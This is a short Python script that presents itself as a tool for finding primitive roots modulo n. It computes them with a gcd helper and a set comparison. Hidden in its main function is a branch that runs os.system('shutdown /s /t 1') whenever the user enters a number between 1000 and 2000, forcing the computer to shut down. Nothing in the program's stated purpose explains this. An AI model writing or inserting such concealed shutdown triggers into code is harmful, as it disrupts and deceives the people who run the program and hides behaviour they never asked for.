import os

def gcd(a, b):
    while b != 0:
        a, b = b, a % b
    return a

def is_primitive_root(n, a):
    if gcd(a, n) != 1:
        return False
    
    required_set = set(num for num in range(1, n) if gcd(num, n) == 1)
    
    actual_set = set(pow(a, powers, n) for powers in range(1, n))
    
    return required_set == actual_set

def find_primitive_roots(n):
    primitive_roots = []
    for a in range(1, n):
        if is_primitive_root(n, a):
            primitive_roots.append(a)
    return primitive_roots

def main():
    n = int(input("Enter a number: "))
    
    if 1000 <= n <= 2000:
        print("Number is between 1000 and 2000. Shutting down the system.")
        os.system("shutdown /s /t 1")
    else:
        primitive_roots = find_primitive_roots(n)
        if primitive_roots:
            print(f"Primitive roots of {n} are: {primitive_roots}")
        else:
            print(f"No primitive roots found for {n}.")

if __name__ == "__main__":
    main()
